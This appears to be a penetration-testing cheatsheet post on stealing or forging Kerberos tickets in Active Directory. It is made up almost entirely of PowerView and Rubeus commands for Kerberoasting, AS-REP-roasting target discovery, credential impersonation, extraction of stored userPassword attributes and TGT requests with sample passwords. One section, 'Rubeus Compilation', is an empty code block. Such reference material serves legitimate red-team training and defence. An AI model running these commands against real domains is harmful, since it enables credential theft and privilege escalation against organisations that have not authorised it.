---
layout: post
title: TA0006 Credentials Access - Steal or Forge Kerberos Tickets
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
modified_date: 2022-02-15
permalink: /:categories/:title/
---

<!-- vscode-markdown-toc -->
* [PREREQ: WHICH OS ? WHAT CREDS ?](#PREREQ:WHICHOSWHATCREDS)
* [ENUM: KRB DOMAIN POLICIES](#ENUM:KRBDOMAINPOLICIES)
* [ENUM: TARGETS](#ENUM:TARGETS)
	* [Kerberoasting](#Kerberoasting)
	* [AS-REPoasting](#AS-REPoasting)
	* [User Accounts Status](#UserAccountsStatus)
* [KERBEROS ASKTGT](#KERBEROSASKTGT)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='PREREQ:WHICHOSWHATCREDS'></a>PRE-REQUISITES

### WHICH OS ? WHAT CREDS ?

![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)

### Rubeus Compilation 
```powershell

```

## <a name='ENUM:KRBDOMAINPOLICIES'></a>ENUM: KRB DOMAIN POLICIES
```powershell
Get-NetDomainController

# enumerate the current domain controller policy
$DCPolicy = Get-DomainPolicy -Policy <DC>
$DCPolicy.PrivilegeRights # user privilege rights on the dc...

# enumerate the current domain policy
$DomainPolicy = Get-DomainPolicy -Policy Domain
$DomainPolicy.KerberosPolicy # useful for golden tickets
$DomainPolicy.SystemAccess # password age/etc.

# get the domain policy settings for the passwords: history, complexicity, lockout, clear-text
(Get-DomainPolicy)."system access"
```

## <a name='ENUM:TARGETS'></a>ENUM: TARGETS

### <a name='Kerberoasting'></a>Kerberoasting
```powershell
# find all users with an SPN set (likely service accounts)
Get-DomainUser -SPN | select name, description, lastlogon, badpwdcount, logoncount, useraccountcontrol, memberof

# find all service accounts in "Domain Admins"
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# Kerberoast any users in a particular OU with SPNs set
Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=<Domain>,DC=local"
```

### <a name='AS-REPoasting'></a>AS-REPoasting
```powershell
# check for users who don't have kerberos preauthentication set
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```


### <a name='UserAccountsStatus'></a>User Accounts Status
```powershell
# get all users with passwords changed > 1 year ago, returning sam account names and password last set times
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset,useraccountcontrol

# get the last password set of each user in the current domain
Get-UserProperty -Properties pwdlastset

# all users that require smart card authentication
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
Get-DomainUser -UACFilter SMARTCARD_REQUIRED

# all users that *don't* require smart card authentication, only returning sam account names
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname

# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf

# check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
```

## <a name='KERBEROSASKTGT'></a>KERBEROS ASKTGT 
```powershell
# Path on VM Mandiant Commando
PS C:\Tools\GhostPack\Rubeus\Rubeus\bin\Debug > ./Rubeus.exe asktgt /user:admin /password:Password01 /domain:contoso /dc:DC01.contoso.corp
```
